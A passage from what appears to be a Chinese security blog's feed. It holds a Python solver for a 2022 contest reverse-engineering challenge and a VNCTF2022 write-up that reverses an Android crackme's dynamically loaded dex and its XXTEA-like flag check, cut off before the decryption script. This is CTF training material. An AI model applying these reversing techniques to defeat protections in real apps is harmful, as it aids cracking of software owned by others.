class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">x, aim</span>):</span></span><br><span class="line">    tmp = x*x</span><br><span class="line">    <span class="keyword">if</span>(x*x &gt;= <span class="number">0xf619</span>):</span><br><span class="line">        tmp = x*x + <span class="number">0x9e7</span></span><br><span class="line">    <span class="keyword">return</span> aim == tmp * x % <span class="number">0xF619</span> * x % <span class="number">0xF619</span> * x % <span class="number">0xF619</span> * x % <span class="number">0xF619</span> * x % <span class="number">0xF619</span></span><br><span class="line"></span><br><span class="line">aims = [<span class="number">42349</span>, <span class="number">12496</span>, <span class="number">33079</span>, <span class="number">33079</span>, <span class="number">44552</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> aim <span class="keyword">in</span> aims:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span>(check(i, aim)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aims2 = [<span class="number">7101</span>, <span class="number">13899</span>, <span class="number">18708</span>, <span class="number">556</span>, <span class="number">1168</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check2</span>(<span class="params">x, aim</span>):</span></span><br><span class="line">    tmp = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">149</span>):</span><br><span class="line">        tmp = tmp * x % <span class="number">37523</span></span><br><span class="line">    <span class="keyword">return</span> tmp == aim</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> aim <span class="keyword">in</span> aims2:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span>(check2(i, aim)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>(<span class="params">fi</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (fi * fi - <span class="number">31921</span> * (((<span class="number">16819</span> * fi * fi) &gt;&gt; <span class="number">16</span>) &gt;&gt; <span class="number">13</span>)) * fi % <span class="number">0x7CB1</span> * fi % <span class="number">0x7CB1</span> * fi % <span class="number">0x7CB1</span> * fi % <span class="number">0x7CB1</span> * fi % <span class="number">0x7CB1</span> * fi % <span class="number">0x7CB1</span> * fi % <span class="number">0x7CB1</span> * fi % <span class="number">0x7CB1</span> * fi % <span class="number">0x7CB1</span></span><br><span class="line"></span><br><span class="line">s = [<span class="number">23598</span>, <span class="number">16034</span> , <span class="number">20727</span> , <span class="number">20727</span> , <span class="number">13486</span>, <span class="number">2231</span> , <span class="number">5750</span> , <span class="number">6799</span>, <span class="number">21861</span>, <span class="number">1528</span> , <span class="number">24635</span> , <span class="number">6799</span> , <span class="number">20754</span> , <span class="number">17756</span> , <span class="number">27966</span> , <span class="number">10529</span> ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span>(calc(x) == i):</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(x), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># int8_2 = BitVec(&#x27;int8_2&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int8_1 = BitVec(&#x27;int8_1&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int6_2 = BitVec(&#x27;int6_2&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int6_1 = BitVec(&#x27;int6_1&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int1_2 = BitVec(&#x27;int1_2&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int1_1 = BitVec(&#x27;int1_1&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int7_2 = BitVec(&#x27;int7_2&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int7_1 = BitVec(&#x27;int7_1&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int2_1 = BitVec(&#x27;int2_1&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int5_2 = BitVec(&#x27;int5_2&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int5_1 = BitVec(&#x27;int5_1&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int3_1 = BitVec(&#x27;int3_1&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int2_2 = BitVec(&#x27;int2_2&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int4_2 = BitVec(&#x27;int4_2&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int4_1 = BitVec(&#x27;int4_1&#x27;, 32)</span></span><br><span class="line"><span class="comment"># int3_2 = BitVec(&#x27;int3_2&#x27;, 32)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = Solver()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s.add( int6_2 ^ int7_2 ^ 0x5FD3 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int7_1 ^ int5_1 ^ 0x477 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int7_2 ^ int4_2 ^ int1_2 ^ 0x6171 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int8_2 ^ int5_2 ^ 0x2CD9 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int6_1 ^ int8_1 ^ 0xD05 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int5_2 ^ int6_2 ^ 0x1F77 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int7_1 ^ 0x5112 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int8_1 ^ 0x6D3E == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int3_2 ^ int8_2 ^ int5_2 ^ 0x246E == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int3_1 ^ int1_1 ^ 0x6880 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int4_2 ^ int1_2 ^ 0x242D == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int2_1 ^ int4_1 ^ 0x4681 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int1_2 ^ int2_2 ^ 0x6E55 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int3_1 ^ 0x34AE == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int2_2 ^ int3_2 ^ int8_2 ^ int5_2 ^ 0x7499 == 0 )</span></span><br><span class="line"><span class="comment"># s.add( int4_1 ^ 0x1676 == 0 )</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if(s.check() == sat):</span></span><br><span class="line"><span class="comment">#     print(s.model())</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;北京理工大学信息系统及安全对抗实验中心 2022年第19届信息安全与对抗技术竞赛 部分逆向题&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://slient2009.github.io/tags/CTF/"/>
    
    <category term="Android" scheme="http://slient2009.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>VNCTF2022 Android cm1.apk</title>
    <link href="http://slient2009.github.io/2022/02/13/Android-Reverse-2/"/>
    <id>http://slient2009.github.io/2022/02/13/Android-Reverse-2/</id>
    <published>2022-02-13T05:00:00.000Z</published>
    <updated>2022-02-12T13:33:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>只有一个Android，我也就只做了个Android，题目链接: <a href="https://buuoj.cn/match/matches/81/challenges">https://buuoj.cn/match/matches/81/challenges</a></p><span id="more"></span><p>首先定位到<code>com.vnctf2022.cm1.MainActivity</code>，发现里面并没有特别的地方，如果安装运行并配合反编译代码，可以很快明白起始这里就是实现了个进度条和反馈收集功能，真正的逻辑在<code>com.vnctf2022.cm1.Main</code>中。</p><p>具体到<code>com.vnctf2022.cm1.Main.init_widget() </code>中，程序先获取了输入然后调用check函数来检查，check()函数中直接去加载了一个dex文件来获取了一个<code>newCls2Check</code>对象进行具体的校验。dex动态加载逻辑在loadDexClass()中，对应的dex文件就是asset目录下的<code>ooo</code>文件。虽然这里有native层的操作，但是都是无关紧要的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// com.vnctf2022.cm1.Main</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">check</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">        IHeihei newCls2check = <span class="keyword">this</span>.loadDexClass();</span><br><span class="line">        <span class="keyword">if</span>(newCls2check == <span class="keyword">null</span>) &#123;</span><br><span class="line">            Toast.makeText(<span class="keyword">this</span>, <span class="string">&quot;errrrrrrrorrrr what are you doing!!!!!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            <span class="keyword">return</span> Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> newCls2check.hcheck(input).booleanValue() ? Boolean.valueOf(<span class="keyword">true</span>) : Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">init_widget</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.btn1 = (Button)<span class="keyword">this</span>.findViewById(<span class="number">0x7F070023</span>);  <span class="comment">// id:btn1</span></span><br><span class="line">        <span class="keyword">this</span>.txt1 = (TextView)<span class="keyword">this</span>.findViewById(<span class="number">0x7F070094</span>);  <span class="comment">// id:txt1</span></span><br><span class="line">        <span class="keyword">this</span>.edit1 = (EditText)<span class="keyword">this</span>.findViewById(<span class="number">0x7F070039</span>);  <span class="comment">// id:edit1</span></span><br><span class="line">        <span class="keyword">this</span>.txt1.setText(<span class="keyword">this</span>.stringFromJNI2());</span><br><span class="line">        <span class="keyword">this</span>.btn1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View arg3)</span> </span>&#123;</span><br><span class="line">                String input = Main.<span class="keyword">this</span>.edit1.getText().toString();</span><br><span class="line">                Main.<span class="keyword">this</span>.txt1.setText(input);</span><br><span class="line">                <span class="keyword">if</span>(Main.<span class="keyword">this</span>.check(input).booleanValue()) &#123;</span><br><span class="line">                    Toast.makeText(Main.<span class="keyword">this</span>.getBaseContext(), <span class="string">&quot;you are right~&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                Toast.makeText(Main.<span class="keyword">this</span>.getBaseContext(), <span class="string">&quot;Wrong!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> IHeihei <span class="title">loadDexClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        File v0 = <span class="keyword">this</span>.getDir(<span class="string">&quot;dex&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        String dexPath = v0.getAbsolutePath() + File.separator + <span class="string">&quot;classes.dex&quot;</span>;</span><br><span class="line">        File dexFile = <span class="keyword">new</span> File(dexPath);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(!dexFile.exists()) &#123;</span><br><span class="line">                dexFile.createNewFile();</span><br><span class="line">                FileUtils.copyFiles(<span class="keyword">this</span>, <span class="string">&quot;ooo&quot;</span>, dexFile);<span class="comment">// 这里的copyFile是自己实现的，并不是直接复制</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(IOException v2_1) &#123;</span><br><span class="line">            v2_1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DexClassLoader v2_2 = <span class="keyword">new</span> DexClassLoader(dexPath, v0.getAbsolutePath(), <span class="keyword">null</span>, <span class="keyword">this</span>.getClassLoader());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IHeihei clsInstance = (IHeihei)v2_2.loadClass(<span class="string">&quot;com.vnctf2022.cm1.Haha&quot;</span>).newInstance();</span><br><span class="line">            <span class="keyword">if</span>(clsInstance != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> clsInstance;</span><br><span class="line">            &#125;</span><br><span class="line">            Log.e(<span class="string">&quot;Mz1&quot;</span>, <span class="string">&quot; --- loaderr&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception v0_1) &#123;</span><br><span class="line">            v0_1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>FileUtils.copyFiles</code>是程序自己实现的，包含了一定的解密逻辑，所以直接用jeb来反编译<code>ooo</code>文件是行不通的。一种简单的办法就是把安装apk并运行，然后直接去目录下面找到对应的<code>classes.dex</code>文件来分析即可。</p><p>分析<code>classes.dex</code>，其中<code>com.vnctf2022.cm1.Haha</code>类包含了相关的校验逻辑，整个校验逻辑稍微复杂了一些，但是耐心梳理还是可以理清的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// classes.dex com.vnctf2022.cm1.Haha</span></span><br><span class="line"><span class="keyword">package</span> com.vnctf2022.cm1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Haha</span> <span class="keyword">implements</span> <span class="title">IHeihei</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String flag;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Haha</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.flag = <span class="string">&quot;flag&#123;fake_flag_again&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] bencrypt(<span class="keyword">byte</span>[] input, <span class="keyword">byte</span>[] keys) &#123;</span><br><span class="line">        <span class="keyword">return</span> input.length == <span class="number">0</span> ? input : Haha.toByteArray(Haha.encrypt(Haha.toIntArray(input, <span class="keyword">false</span>), Haha.toIntArray(keys, <span class="keyword">false</span>)), <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] encrypt(<span class="keyword">int</span>[] input, <span class="keyword">int</span>[] keys) &#123;</span><br><span class="line">        <span class="keyword">int</span> rounds = <span class="number">52</span> / input.length + <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">int</span> rnd_s = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> prev_int = input[input.length - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            rnd_s += -<span class="number">1640531527</span>;</span><br><span class="line">            <span class="keyword">int</span> rnd_e = rnd_s &gt;&gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">int</span> ind;</span><br><span class="line">            <span class="keyword">for</span>(ind = <span class="number">0</span>; ind &lt; input.length - <span class="number">1</span>; ++ind) &#123;</span><br><span class="line">                <span class="keyword">int</span> ind_chr = input[ind] + ((prev_int &gt;&gt;&gt; <span class="number">5</span> ^ input[ind + <span class="number">1</span>] &lt;&lt; <span class="number">2</span>) + (input[ind + <span class="number">1</span>] &gt;&gt;&gt; <span class="number">3</span> ^ prev_int &lt;&lt; <span class="number">4</span>) ^ (rnd_s ^ input[ind + <span class="number">1</span>]) + (keys[ind &amp; <span class="number">3</span> ^ rnd_e] ^ prev_int));</span><br><span class="line">                input[ind] = ind_chr;</span><br><span class="line">                prev_int = ind_chr;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> next_int = input[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> last_ind = input.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> lc = input[last_ind] + ((prev_int &gt;&gt;&gt; <span class="number">5</span> ^ next_int &lt;&lt; <span class="number">2</span>) + (next_int &gt;&gt;&gt; <span class="number">3</span> ^ prev_int &lt;&lt; <span class="number">4</span>) ^ (rnd_s ^ next_int) + (keys[ind &amp; <span class="number">3</span> ^ rnd_e] ^ prev_int));</span><br><span class="line">            input[last_ind] = lc;</span><br><span class="line">            prev_int = lc;</span><br><span class="line">            --rounds;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(rounds &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// com.vnctf2022.cm1.IHeihei</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">hcheck</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] aim = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">68</span>, <span class="number">39</span>, -<span class="number">92</span>, <span class="number">108</span>, -<span class="number">82</span>, -<span class="number">18</span>, <span class="number">72</span>, -<span class="number">55</span>, <span class="number">74</span>, -<span class="number">56</span>, <span class="number">38</span>, <span class="number">11</span>, <span class="number">60</span>, <span class="number">84</span>, <span class="number">97</span>, -<span class="number">40</span>, <span class="number">87</span>, <span class="number">71</span>, <span class="number">99</span>, -<span class="number">82</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">0x2F</span>, -<span class="number">71</span>, -<span class="number">58</span>, -<span class="number">57</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">42</span>, <span class="number">38</span>, -<span class="number">44</span>, -<span class="number">39</span>, -<span class="number">60</span>, <span class="number">0x71</span>, -<span class="number">2</span>, <span class="number">92</span>, -<span class="number">75</span>, <span class="number">0x76</span>, -<span class="number">77</span>, <span class="number">50</span>, <span class="number">0x87</span>, <span class="number">43</span>, <span class="number">0x20</span>, -<span class="number">106</span>&#125;;</span><br><span class="line">        <span class="keyword">byte</span>[] _tmp = Haha.bencrypt(input.getBytes(), <span class="string">&quot;H4pPY_VNCTF!!OvO&quot;</span>.getBytes());</span><br><span class="line">        <span class="keyword">if</span>(_tmp.length != aim.length) &#123;</span><br><span class="line">            <span class="keyword">return</span> Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; _tmp.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span>(_tmp[i] != aim[i]) &#123;</span><br><span class="line">                <span class="keyword">return</span> Boolean.valueOf(<span class="keyword">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> Boolean.valueOf(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// com.vnctf2022.cm1.IHeihei</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hi</span><span class="params">(Context arg3)</span> </span>&#123;</span><br><span class="line">        Toast.makeText(arg3, <span class="string">&quot;anothor dex&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] toByteArray(<span class="keyword">int</span>[] arg5, <span class="keyword">boolean</span> arg6) &#123;  <span class="comment">// 把intArray分拆为byteArray</span></span><br><span class="line">        <span class="keyword">int</span> n = arg5.length &lt;&lt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(arg6) &#123;</span><br><span class="line">            <span class="keyword">int</span> m = arg5[arg5.length - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span>(m &gt; n) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            n = m;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] result = <span class="keyword">new</span> <span class="keyword">byte</span>[n];</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            result[i] = (<span class="keyword">byte</span>)(arg5[i &gt;&gt;&gt; <span class="number">2</span>] &gt;&gt;&gt; ((i &amp; <span class="number">3</span>) &lt;&lt; <span class="number">3</span>) &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span>[] toIntArray(<span class="keyword">byte</span>[] arg7, <span class="keyword">boolean</span> arg8) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] result;</span><br><span class="line">        <span class="keyword">int</span> v0 = (arg7.length &amp; <span class="number">3</span>) == <span class="number">0</span> ? arg7.length &gt;&gt;&gt; <span class="number">2</span> : (arg7.length &gt;&gt;&gt; <span class="number">2</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(arg8) &#123;</span><br><span class="line">            result = <span class="keyword">new</span> <span class="keyword">int</span>[v0 + <span class="number">1</span>];</span><br><span class="line">            result[v0] = arg7.length;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            result = <span class="keyword">new</span> <span class="keyword">int</span>[v0];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; arg7.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> v3 = i &gt;&gt;&gt; <span class="number">2</span>;</span><br><span class="line">            result[v3] |= (arg7[i] &amp; <span class="number">0xFF</span>) &lt;&lt; ((i &amp; <span class="number">3</span>) &lt;&lt; <span class="number">3</span>);  <span class="comment">// result[i]是一个int，对应输入的每连续4个char</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输入的<code>string input</code>先转换成<code>byte[]</code>，然后送入<code>bencrypt(byte[], byte[])</code>进行加密，使用到的密钥是<code>&quot;H4pPY_VNCTF!!OvO&quot;.getBytes()</code>。</p><p>在<code>bencrypt()</code>函数中，先把<code>byte[] input</code>和<code>byte[] keys</code>转换为int序列。其实就是每4个byte合并成int32，然后送入<code>encrypt(int[], int[])</code>进行加密，然后把这个加密函数返回的<code>int[]</code>转换回<code>byte[]</code>，其实就是前面转换的逆过程，把每个int32拆解为4个byte。然后比较得到的<code>byte[]</code>和<code>byte[] aim</code>是否一致。</p><p>具体到<code>encrypt()</code>内部，是一个对input的多轮加密过程。简单来说，每轮加密时，下一轮密文next_input[i]由本轮的input[i+1]、刚刚计算得到的next_input[i-1]、keys[]和两个轮密钥rnd_s和rnd_e计算得到。（input[-1]=input[length-1], input[length]=input[0]）</p><p>$next_input[i] = func(input[i+1], next_input[i-1], keys[], rnd_s, rnd_e), i : 0 \rightarrow n$</p><p>这个过程可以视作顺序的递推，是可逆的，逆操作就是倒序的逆推。</p><p>$input[i]=reverse_func(input[i+1], next_input[i-1], keys[], rnd_s, rnd_e), i : n \rightarrow 0$</p><p>涉及到的三组密钥都是固定的，与输入无关。<br>aim的长度为44，所以input也即flag长度为44，共计加密10轮。</p><p>解密脚本如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 